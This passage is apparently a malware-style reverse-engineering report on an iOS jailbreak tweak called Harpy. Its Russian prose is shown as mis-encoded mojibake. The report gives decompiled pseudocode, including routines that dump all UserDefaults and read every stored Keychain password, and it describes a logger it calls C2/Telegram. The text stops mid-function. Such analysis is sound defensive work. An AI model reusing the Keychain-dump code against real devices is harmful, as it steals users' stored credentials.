# üî¨ –ü–æ–ª–Ω—ã–π —Ä–µ–≤–µ—Ä—Å-–∏–Ω–∂–∏–Ω–∏—Ä–∏–Ω–≥ harpy_fixed_v3.dylib

## –û–≥–ª–∞–≤–ª–µ–Ω–∏–µ
- [–û–±—â–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è](#-–æ–±—â–∞—è-–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è)
- [–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞](#-–∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞-–±–∏–Ω–∞—Ä–Ω–∏–∫–∞)
- [–ö–∞—Ä—Ç–∞ –ø–∞–º—è—Ç–∏ (–°–µ–≥–º–µ–Ω—Ç—ã)](#-–∫–∞—Ä—Ç–∞-–ø–∞–º—è—Ç–∏-—Å–µ–≥–º–µ–Ω—Ç—ã)
- [–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è](#-–∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è)
- [–¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞](#-—Ç–æ—á–∫–∞-–≤—Ö–æ–¥–∞-entry-point)
- [Harpy DSL ‚Äî –°–∫—Ä–∏–ø—Ç–æ–≤—ã–π —è–∑—ã–∫](#-harpy-dsl--—Å–∫—Ä–∏–ø—Ç–æ–≤—ã–π-—è–∑—ã–∫)
- [–ü–∞—Ä—Å–µ—Ä —Å–∫—Ä–∏–ø—Ç–æ–≤ (sub_42B54)](#-–ø–∞—Ä—Å–µ—Ä-—Å–∫—Ä–∏–ø—Ç–æ–≤-sub_42b54)
- [–°–µ—Ç–µ–≤–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å (C2)](#-—Å–µ—Ç–µ–≤–∞—è-–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å-c2)
- [UI —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (SwiftUI)](#-ui-—Å—Ç—Ä—É–∫—Ç—É—Ä–∞-swiftui)
- [–§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–∞—è –∫–∞—Ä—Ç–∞](#-–ø–æ–ª–Ω–∞—è-—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–∞—è-–∫–∞—Ä—Ç–∞)
- [–ò–º–ø–æ—Ä—Ç—ã –∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏](#-–∏–º–ø–æ—Ä—Ç—ã-–∏-–∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏)
- [–°—Ç—Ä–æ–∫–∏ –∏ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã](#-–∫–ª—é—á–µ–≤—ã–µ-—Å—Ç—Ä–æ–∫–∏-–∏-–∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã)
- [–ò–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ (IoC)](#-–∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã-–∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏-ioc)

---

## üìã –û–±—â–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

| –ü–∞—Ä–∞–º–µ—Ç—Ä | –ó–Ω–∞—á–µ–Ω–∏–µ |
|----------|----------|
| **–¢–∏–ø —Ñ–∞–π–ª–∞** | iOS Dynamic Library (.dylib) |
| **–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞** | ARM64e (Apple iOS jailbreak tweak) |
| **–†–∞–∑–º–µ—Ä** | 441,336 –±–∞–π—Ç (0x6BBF8) |
| **MD5** | `d0701a2f9fb3e92853472d0298bd4415` |
| **SHA256** | –¢—Ä–µ–±—É–µ—Ç—Å—è –≤—ã—á–∏—Å–ª–µ–Ω–∏–µ |
| **–ü—É—Ç—å —É—Å—Ç–∞–Ω–æ–≤–∫–∏** | `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` |
| **–Ø–∑—ã–∫** | Swift 5 + Objective-C interop |
| **Min iOS Version** | iOS 14.0+ (–ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ) |
| **–§—Ä–µ–π–º–≤–æ—Ä–∫–∏** | SwiftUI, Combine, CoreData, Security, Network, CydiaSubstrate |

---

## üèõÔ∏è –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –±–∏–Ω–∞—Ä–Ω–∏–∫–∞

### –ö–∞—Ä—Ç–∞ –ø–∞–º—è—Ç–∏ (–°–µ–≥–º–µ–Ω—Ç—ã)

| –°–µ–≥–º–µ–Ω—Ç | –ù–∞—á–∞–ª–æ | –ö–æ–Ω–µ—Ü | –†–∞–∑–º–µ—Ä | –ü—Ä–∞–≤–∞ | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|---------|--------|-------|--------|-------|------------|
| `__TEXT` | 0x0 | 0x5C000 | 376KB | R-X | –ò—Å–ø–æ–ª–Ω—è–µ–º—ã–π –∫–æ–¥ |
| `__DATA_CONST` | 0x5C000 | 0x60000 | 16KB | R-- | –ö–æ–Ω—Å—Ç–∞–Ω—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ |
| `__DATA` | 0x60000 | 0x68000 | 32KB | RW- | –ò–∑–º–µ–Ω—è–µ–º—ã–µ –¥–∞–Ω–Ω—ã–µ |
| `__LINKEDIT` | 0x68000 | 0x6C000 | 16KB | R-- | –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–ª—è –ª–∏–Ω–∫–µ—Ä–∞ |

### –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Ñ—É–Ω–∫—Ü–∏–π

| –ú–µ—Ç—Ä–∏–∫–∞ | –ó–Ω–∞—á–µ–Ω–∏–µ |
|---------|----------|
| **–í—Å–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏–π** | ~920 |
| **Swift —Ñ—É–Ω–∫—Ü–∏–π** | ~800 |
| **ObjC –º–µ—Ç–æ–¥–æ–≤** | ~50 |
| **Thunk/Bridge** | ~70 |
| **–°—Ç—Ä–æ–∫** | ~500+ |
| **–°—Ç—Ä—É–∫—Ç—É—Ä** | ~50 |
| **Local types** | ~90 |

---

## üèóÔ∏è –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

**Harpy** ‚Äî iOS jailbreak-—Ç–≤–∏–∫ —Å SwiftUI –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–ø—Ç–æ–≤ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.

### –ö–ª–∞—Å—Å–æ–≤–∞—è –∏–µ—Ä–∞—Ä—Ö–∏—è

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                        CydiaSubstrate                          ‚îÇ
‚îÇ                    (MobileSubstrate hook)                       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚îÇ
                           ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                      SwiftUIWrapper                             ‚îÇ
‚îÇ  +startMonitoring ‚Üí dispatch_after(2sec) ‚Üí presentContentView  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚îÇ
           ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
           ‚ñº               ‚ñº               ‚ñº
    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    ‚îÇ  AppState   ‚îÇ ‚îÇ  UserData   ‚îÇ ‚îÇHarpyLogger  ‚îÇ
    ‚îÇ  (Singleton)‚îÇ ‚îÇ(Environment)‚îÇ ‚îÇ   (C2)      ‚îÇ
    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
           ‚îÇ               ‚îÇ               ‚îÇ
           ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                        HarpyView                                ‚îÇ
‚îÇ              (Main UI - sub_363B8, ~983 lines)                  ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  Start  ‚îÇ ‚îÇ Settings ‚îÇ ‚îÇ  Scripts  ‚îÇ ‚îÇ    Logger       ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ Button  ‚îÇ ‚îÇ   View   ‚îÇ ‚îÇ   View    ‚îÇ ‚îÇ     View        ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ       ‚îÇ           ‚îÇ             ‚îÇ                ‚îÇ              ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
        ‚îÇ           ‚îÇ             ‚îÇ                ‚îÇ
        ‚ñº           ‚ñº             ‚ñº                ‚ñº
   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
   ‚îÇ               HarpyScript Parser (sub_42B54)             ‚îÇ
   ‚îÇ                     (~1883 lines)                        ‚îÇ
   ‚îÇ   .harpy.* commands ‚Üí NSRegularExpression ‚Üí Execute      ‚îÇ
   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                               ‚îÇ
              ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
              ‚ñº                ‚ñº                ‚ñº
        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
        ‚îÇUserDefaults‚îÇ   ‚îÇ Keychain ‚îÇ     ‚îÇ CoreData ‚îÇ
        ‚îÇ  Manager   ‚îÇ   ‚îÇ Manager  ‚îÇ     ‚îÇ Manager  ‚îÇ
        ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –û—Å–Ω–æ–≤–Ω—ã–µ –∫–ª–∞—Å—Å—ã –∏ –∞–¥—Ä–µ—Å–∞

| –ö–ª–∞—Å—Å | –ê–¥—Ä–µ—Å –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö | –û–ø–∏—Å–∞–Ω–∏–µ |
|-------|------------------|----------|
| `AppState` | 0xB77C | Singleton —Å–æ—Å—Ç–æ—è–Ω–∏—è (swift_once) |
| `SwiftUIWrapper` | - | ObjC wrapper –¥–ª—è SwiftUI |
| `UserData` | 0x68B78 | EnvironmentObject –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è |
| `HarpyScript` | 0x696E8 | –°–∫—Ä–∏–ø—Ç–æ–≤—ã–π –¥–≤–∏–∂–æ–∫ |
| `HarpyLogger` | 0x69700 | –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ C2/Telegram |
| `HarpyBuy` | 0x696F8 | –≠–∫—Ä–∞–Ω –ø–æ–∫—É–ø–∫–∏ |
| `Scripting` | 0x696E0 | –†–µ–¥–∞–∫—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–æ–≤ |
| `GeneralView` | 0x69708 | –û–±—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ |
| `ContentView` | - | –ö–æ—Ä–Ω–µ–≤–æ–π View |

---

## üöÄ –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞ (Entry Point)

### sub_4000 ‚Äî Dylib Initialization

```c
// –ê–¥—Ä–µ—Å: 0x4000
void __fastcall sub_4000() {
    // –ü–æ–ª—É—á–µ–Ω–∏–µ singleton AppState
    // –í—ã–∑–æ–≤ +[SwiftUIWrapper startMonitoring]
    objc_msgSend(SwiftUIWrapper, "startMonitoring");
    
    // –ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
                   dispatch_get_main_queue(),
                   ^{
                       // Block –≤ stru_64E70
                       // –ü–æ–∫–∞–∑ UI
                   });
}
```

### AppState_onStartPressed (0x3BEE0) ‚Äî Start Monitoring Handler

```c
// –ê–¥—Ä–µ—Å: 0x3BEE0 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: AppState_onStartPressed)
// –í—ã–∑—ã–≤–∞–µ—Ç—Å—è –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏ "Start"
void AppState_onStartPressed() {
    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–ª–∞–≥–∞ isStartPressed = 1
    AppState.isStartPressed = 1;  // OBJC_IVAR____TtC5harpy8AppState_isStartPressed
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è C2 —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
    DispatchQueue_getMetadata(0);  // –ü–æ–ª—É—á–µ–Ω–∏–µ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö –æ—á–µ—Ä–µ–¥–∏
    
    // Async –∑–∞–¥–∞—á–∞ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
    DispatchTime now = DispatchTime.now();
    DispatchTime delay = now + 2.0;
    OS_dispatch_queue.asyncAfter(delay, block);
}
```

### StartButton_createView (0x4546C) ‚Äî UI –∫–Ω–æ–ø–∫–∏ "Start"

```c
// –ê–¥—Ä–µ—Å: 0x4546C (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: StartButton_createView)
// –°–æ–∑–¥–∞–µ—Ç SwiftUI –∫–Ω–æ–ø–∫—É –∑–∞–ø—É—Å–∫–∞
View StartButton_createView() {
    Text("Start")                           // LocalizedStringKey: 0x7472617453
        .font(.title2)                      // Font.TextStyle.title2
        .fontDesign(.rounded)               // Font.Design.rounded
        .fontWeight(.semibold)              // Font.Weight.semibold
        .foregroundColor(.white)            // static Color.white.getter
        .frame(height: 70)                  // 0x4051800000000000 = 70.0
        .padding(.horizontal, 25)           // EdgeInsets._all(25.0)
        .background {
            RoundedRectangle(cornerRadius: 20)  // FMOV V0.2D, #20.0
                .fill(Color.black)              // static Color.black.getter
        }
}
```

---

## üîß Harpy DSL ‚Äî –°–∫—Ä–∏–ø—Ç–æ–≤—ã–π —è–∑—ã–∫

### –ü–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥

#### üìÅ UserDefaults –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ö–æ–º–∞–Ω–¥–∞ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ | –û–ø–∏—Å–∞–Ω–∏–µ |
|---------|--------------|----------|
| `.harpy.edit.userdefaults` | 0x50990 | –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–ª—é—á–∞ |
| `.harpy.remove.userdefaults` | 0x509b0 | –£–¥–∞–ª–µ–Ω–∏–µ –∫–ª—é—á–∞ |
| `.harpy.clear.userdefaults` | 0x509d0 | –ü–æ–ª–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ |
| `.harpy.read.userdefaults` | 0x509f0 | –ß—Ç–µ–Ω–∏–µ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö |

–ü—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ (sub_42B54):
```c
// –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è –≤ UserDefaults
v50 = objc_msgSend(objc_opt_self(&OBJC_CLASS___NSUserDefaults), "standardUserDefaults");
v51 = String._bridgeToObjectiveC()(key);
v52 = String._bridgeToObjectiveC()(value);
objc_msgSend(v50, "setObject:forKey:", v51, v52);
```

**Harpy_readUserDefaults (0x46654)** ‚Äî –ß—Ç–µ–Ω–∏–µ –≤—Å–µ—Ö UserDefaults:
```c
// –ê–¥—Ä–µ—Å: 0x46654 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_readUserDefaults)
String Harpy_readUserDefaults() {
    // –ó–∞–≥–æ–ª–æ–≤–æ–∫ –≤—ã–≤–æ–¥–∞
    char output[24] = "UserDefaults:\n";
    
    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö UserDefaults
    NSUserDefaults *defaults = [[NSUserDefaults standardUserDefaults];
    NSDictionary *dict = [defaults dictionaryRepresentation];
    
    // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤ Swift Dictionary
    Dictionary<String, Any> swiftDict = Dictionary._unconditionallyBridgeFromObjectiveC(dict);
    
    // –ò—Ç–µ—Ä–∞—Ü–∏—è –ø–æ –≤—Å–µ–º –∫–ª—é—á–∞–º
    for (key, value in swiftDict) {
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ: "key: value\n"
        String.append(key);
        String.append(": ");
        _print_unlocked(value);
        String.append("\n");
    }
    
    return output;  // –ü–æ–ª–Ω—ã–π –¥–∞–º–ø UserDefaults
}
```

#### üîê Keychain –æ–ø–µ—Ä–∞—Ü–∏–∏

| –ö–æ–º–∞–Ω–¥–∞ | –ê–¥—Ä–µ—Å —Å—Ç—Ä–æ–∫–∏ | Regex –ø–∞—Ç—Ç–µ—Ä–Ω |
|---------|--------------|---------------|
| `.harpy.edit.keychain` | 0x50a10 | `\.harpy\.edit\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.remove.keychain` | 0x50a30 | `\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$` |
| `.harpy.read.keychain` | 0x50a50 | - |

**Harpy_readKeychain (0x46DC0)** ‚Äî –ß—Ç–µ–Ω–∏–µ –≤—Å–µ—Ö –∑–∞–ø–∏—Å–µ–π Keychain:
```c
// –ê–¥—Ä–µ—Å: 0x46DC0 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_readKeychain)
String Harpy_readKeychain() {
    // –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ query –¥–ª—è —á—Ç–µ–Ω–∏—è –í–°–ï–• –ø–∞—Ä–æ–ª–µ–π
    NSDictionary *query = @{
        (id)kSecClass: (id)kSecClassGenericPassword,
        (id)kSecMatchLimit: (id)kSecMatchLimitAll,
        (id)kSecReturnAttributes: @YES,
        (id)kSecReturnData: @YES
    };
    
    CFTypeRef result = nil;
    OSStatus status = SecItemCopyMatching((CFDictionaryRef)query, &result);
    
    if (status == errSecSuccess && result != nil) {
        // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è CFArray –≤ Swift Array
        Array<Dictionary> items = dynamicCast(result);
        
        // –û–±—ä–µ–¥–∏–Ω–µ–Ω–∏–µ –≤—Å–µ—Ö –∑–∞–ø–∏—Å–µ–π —á–µ—Ä–µ–∑ "\n"
        return BidirectionalCollection.joined(separator: "\n");
    }
    
    return "Keychain read error";  // –ö–æ–¥ –æ—à–∏–±–∫–∏: 0x1000000000000021
}
```

**Harpy_editKeychain (0x46C94)** ‚Äî –£–¥–∞–ª–µ–Ω–∏–µ –∑–∞–ø–∏—Å–∏ –∏–∑ Keychain:
```c
// –ê–¥—Ä–µ—Å: 0x46C94 (–ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ: Harpy_editKeychain)
void Harpy_editKeychain(String accountName) {
    // –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ query –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è
    NSDictionary *query = @{
        (id)kSecClass: (id)kSecClassGenericPassword,
        (id)kSecAttrAccount: accountName
    };
    
